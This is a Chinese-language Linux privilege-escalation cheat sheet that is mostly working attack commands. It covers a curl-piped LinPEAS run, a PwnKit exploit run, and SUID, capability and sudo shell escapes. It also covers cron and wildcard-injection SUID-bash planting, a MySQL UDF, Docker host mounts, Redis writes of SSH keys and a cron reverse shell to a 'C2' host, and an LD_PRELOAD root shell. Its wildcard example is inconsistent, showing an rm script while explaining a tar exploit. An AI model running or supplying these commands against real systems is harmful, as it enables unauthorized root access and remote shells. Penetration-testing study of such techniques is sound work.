# Linux 提权手法速查手册

> Linux 提权本质是"以低权限身份，找到系统中以高权限运行 / 配置的资源，并以该资源的身份执行代码"。本文档系统梳理常见提权路径。

## 1. 提权前的信息收集（Manual Enumeration）

拿到 Shell 后，第一件事是搞清楚"我在哪、我是谁、系统有什么"：

| 命令 | 作用 |
|------|------|
| `id`、`whoami`、`groups` | 当前用户与所属组 |
| `uname -a`、`cat /proc/version`、`uname -r` | 内核版本与发行版 |
| `cat /etc/os-release`、`cat /etc/issue` | 系统发行版 |
| `sudo -l` / `sudo -n -l` | 查看当前用户可 sudo 执行的命令 |
| `ps aux | grep root` | 查看 root 运行的进程 |
| `netstat -tnlp` / `ss -tlnp` | 监听端口（本地服务常可被攻击） |
| `find / -perm -4000 -type f 2>/dev/null` | 查找 SUID 文件 |
| `find / -writable -type d 2>/dev/null` | 查找所有可写目录 |
| `cat /etc/passwd`、`cat /etc/shadow`（如可读） | 用户与口令信息 |
| `cat ~/.bash_history`、`history` | 历史命令（偶有密码 / 凭据泄漏） |
| `ls -la /home/*/`、`ls -la /root/`（如可读） | 家目录 |
| `cat /var/log/dpkg.log`、`rpm -qa` | 已安装软件包及版本 |
| `ls -la /tmp`、`ls -la /var/tmp` | 临时目录 |
| `mount`、`df -h`、`cat /etc/fstab` | 挂载信息（可能发现 NFS / SMB） |
| `cat /etc/crontab`、`ls -la /etc/cron.d/`、`crontab -l` | 定时任务（cron 往往以 root 运行） |

常用自动化脚本：`LinPEAS.sh`、`linux-smart-enumeration`、`LinEnum.sh`、`pspy`（无权限监控进程活动）

```bash
# 一键上传执行 LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

## 2. 内核漏洞提权（Kernel Exploit）

通过内核 CVE 获取 root 权限，是"简单粗暴"的路径。常见 Linux Kernel Exploit 速查表：

| CVE | 影响内核 | 说明 | 经典 exp |
|-----|---------|------|---------|
| CVE-2021-3493 | Ubuntu OverlayFS 漏洞 | 某些 Ubuntu 版本存在 | overlayfs 提权 |
| CVE-2021-4034 (PwnKit) | 存在 Polkit 的 Linux 系统 | `pkexec` 本地提权 | pwnkit.c |
| CVE-2019-13272 | Linux < 5.1.17 | PTRACE_TRACEME 提权 | - |
| CVE-2022-0847 (Dirty Pipe) | 5.8 ≤ Linux ≤ 5.17-rc6 | 任意文件覆写 | dirty-pipe.c |
| CVE-2016-5195 (Dirty Cow) | Linux 2.6.22 - 4.8.3 | 写只读内存 | dirtycow.c |
| CVE-2017-16995 (Ubuntu eBPF) | Ubuntu kernel 4.4 | eBPF verifier 漏洞 | - |
| CVE-2023-32233 | Linux 内核 perf_event | 堆溢出提权 | perf_event.c |
| CVE-2024-1086 | Linux netfilter nf_tables | 释放后使用 | - |

```bash
# 使用 PwnKit (CVE-2021-4034)
# 编译后执行即可（无需参数、无需交互）
gcc -o pwnkit pwnkit.c && ./pwnkit
whoami
# root
```

注意事项：
- 内核 exp 有一定几率崩溃系统，需提前和甲方沟通
- GCC / make 是否存在；无 gcc 时需提前上传编译好的二进制
- 某些容器（如 Docker）中内核漏洞也能逃逸，需注意容器 vs 宿主机

## 3. SUID / SGID / Capabilities 提权

### 3.1 查找 SUID 文件

```bash
# 查找 SUID 文件
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
# 查找 SGID 文件
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null
```

### 3.2 常见危险 SUID 程序及利用

| 程序 | 利用 |
|------|------|
| `nmap` (2.x - 5.x) | 老版本支持 `--interactive`，进入交互模式后执行 `!sh` |
| `vim` / `vi` | `:!sh` 或 `vim -c ':!/bin/sh'` |
| `find` | `find / -exec /bin/bash \; -quit` |
| `bash` / `sh` | `./bash -p`（保留 SUID 权限） |
| `less` / `more` | `less /etc/passwd` 后输入 `!/bin/sh` |
| `man` | `man` 某个命令，输入 `!/bin/sh` |
| `nano` | `^R^X` 执行命令 |
| `cp` / `mv` | 复制 /etc/shadow 到可写路径，修改后再覆盖 |
| `awk` | `awk 'BEGIN { system("/bin/sh") }'` |
| `perl` / `python` | `python -c "import os; os.setuid(0); os.system('/bin/bash')"` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `curl` / `wget` | 读取 /etc/shadow，或通过 FTP 上传文件到敏感路径 |

```bash
# 通用 SUID 程序提权：当某程序为 root 拥有且 SUID，而它是脚本文件时
# 可尝试修改 PATH 让其调用自己准备的同名程序
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/ls
echo 'cp /bin/bash /tmp/.bash; chmod u+s /tmp/.bash' >> /tmp/ls
chmod +x /tmp/ls
./vuln_program   # 只要 vuln_program 内部调用了 ls 且以 SUID 运行，则成功
/tmp/.bash -p
```

### 3.3 Capabilities 提权

Linux Capabilities 是比 SUID 更细粒度的权限机制：

```bash
# 查看文件的 capabilities
getcap -r / 2>/dev/null

# 常见危险 capabilities
# - cap_setuid+ep    → 可以 setuid(0)
# - cap_net_raw+ep   → 可以 packet capture
# - cap_sys_ptrace+ep → 可以 ptrace 任意进程
# - cap_dac_read_search+ep → 读任意文件
# - cap_dac_override+ep    → 绕过文件权限

# python 有 cap_setuid 时直接提权
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# tcpdump 有 cap_net_raw 时可抓明文密码等
```

## 4. Sudo 滥用与危险命令

`sudo -l` 能看到用户可执行哪些命令。若其中包含如下工具，往往可直接提权：

```bash
# 以下任何工具以 sudo 运行时，均可执行 /bin/sh
sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN { system("/bin/bash") }'
sudo find / -exec /bin/bash \; -quit
sudo nmap --interactive     # 老版本，交互式进入后 !sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo less /etc/profile     # !sh
sudo man man                # !sh
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/sh")'
sudo socat TCP-LISTEN:1234 EXEC:/bin/sh    # 远端连 1234 即可
sudo tcpdump -n -i lo -w /dev/null -z /bin/bash /dev/null &
# 利用 env 保留 LD_PRELOAD
sudo -u root LD_PRELOAD=/tmp/evil.so /usr/bin/xxxx
```

### 4.1 经典 NOPASSWD 配置

`/etc/sudoers` 中类似配置即存在严重风险：
```
www-data ALL=(ALL) NOPASSWD: ALL
user     ALL=(root) NOPASSWD: /usr/bin/find
```

### 4.2 CVE-2019-14287：`sudo -u#-1` 提权

`sudo < 1.8.28` 中，`sudo -u#-1 id` 或 `sudo -u#4294967295 id` 以 root 身份执行（需当前用户在 sudoers 中允许以任意其他用户执行）。

## 5. Cron / 计划任务提权

### 5.1 Cron 脚本路径可写

```bash
# 观察 /etc/crontab 和 /etc/cron.d/ 下脚本是否可写
ls -la /etc/cron.d/
# 若某个 root 运行的脚本可写，直接追加：
echo 'cp /bin/bash /tmp/.bash; chmod u+s /tmp/.bash' >> /path/to/cron-script.sh
```

### 5.2 通配符注入（Wildcard Injection）

Cron 脚本如果写了类似：

```bash
#!/bin/bash
cd /var/www/html
rm -rf *
```

攻击者在 `/var/www/html` 创建名为 `--checkpoint-action=exec=sh shell.sh` 的文件，`rm` 被当作选项解析。原理：在该目录执行 `tar zcf /tmp/backup.tar.gz *`（常见备份脚本）时，`*` 会匹配攻击者创建的名为 `--checkpoint-action=exec=sh shell.sh` 和 `--checkpoint=1` 的文件，导致 tar 执行 `sh shell.sh`。

```bash
# 攻击者
cd /tmp
echo 'cp /bin/bash /tmp/.bash; chmod u+s /tmp/.bash' > shell.sh
chmod +x shell.sh
echo '' > "--checkpoint-action=exec=sh shell.sh"
echo '' > --checkpoint=1
# 然后等待 cron 执行 tar zcf /tmp/backup.tar.gz /tmp/*（或类似）
/tmp/.bash -p
```

### 5.3 PATH 环境变量劫持

Cron 脚本使用相对路径调用程序：

```bash
#!/bin/bash
run-backup.sh
```

若 `PATH` 中含 `/tmp`，攻击者可在 `/tmp` 写入同名文件实现命令执行。

## 6. 服务提权（NFS、MySQL、Docker、Redis 等）

### 6.1 NFS 挂载（no_root_squash）

```bash
# NFS 服务端配置 /etc/exports 包含 no_root_squash
# 攻击者以 root 身份挂载，写入的文件 UID 0 被视为有效
mount -t nfs target:/share /mnt/target
cp /bin/bash /mnt/target/.bash
chmod u+s /mnt/target/.bash
# 然后在 target 上 /share/.bash -p
```

### 6.2 MySQL UDF / 写入文件

```sql
-- 需要 MySQL root 权限且 plugin_dir 可写
-- 传统 UDF 提权
CREATE TABLE fn (line BLOB);
INSERT INTO fn VALUES (LOAD_FILE('/tmp/udf.so'));
SELECT * FROM fn INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
SELECT sys_exec('cp /bin/bash /tmp/.bash; chmod u+s /tmp/.bash');
```

### 6.3 Docker 组提权

用户属于 `docker` 组即可通过 Docker 挂载宿主机文件系统：

```bash
docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash
# 或以特权模式启动
docker run --privileged -v /:/host --rm -it alpine sh
```

### 6.4 Redis 未授权写 SSH Key / 计划任务

```bash
# 写 SSH Key
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h target -x set crackit
redis-cli -h target config set dir /root/.ssh
redis-cli -h target config set dbfilename authorized_keys
redis-cli -h target save

# 写 cron 计划任务
redis-cli -h target config set dir /var/spool/cron/
redis-cli -h target config set dbfilename root
redis-cli -h target set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/C2/443 0>&1\n\n"
redis-cli -h target save
```

### 6.5 LD_PRELOAD 劫持 sudo

```c
// evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
// gcc -fPIC -shared -o evil.so evil.c -nostartfiles
// 需 sudo -l 中显示 SETENV 标志
sudo LD_PRELOAD=/tmp/evil.so id
```

## 7. 提权路径检查清单（快速判断优先级）

```
1. sudo -l 是否存在 NOPASSWD、SETENV 或危险命令?
2. 是否有 SUID/SGID 危险文件?
3. 是否有能力（capabilities）异常的二进制?
4. 是否有可写的 cron 任务 / 服务脚本 / systemd unit?
5. 内核版本是否命中经典 Kernel Exploit?
6. 是否存在 NFS no_root_squash、Docker 组、lxd 组?
7. 是否有 web 目录可写且 www-data 可执行?
8. 是否有正在运行以 root 权限运行的旧版本软件（Redis、MySQL、Nginx 插件）?
9. 敏感文件权限（/etc/passwd、/etc/shadow、.ssh/）是否异常?
10. 是否存在通配符 injection、PATH 劫持可能?
```

---

> 提权的本质是"信息收集 → 漏洞匹配 → 代码执行"的循环。本手册用于合法授权的渗透测试与企业安全审计，严禁在未授权系统上使用。
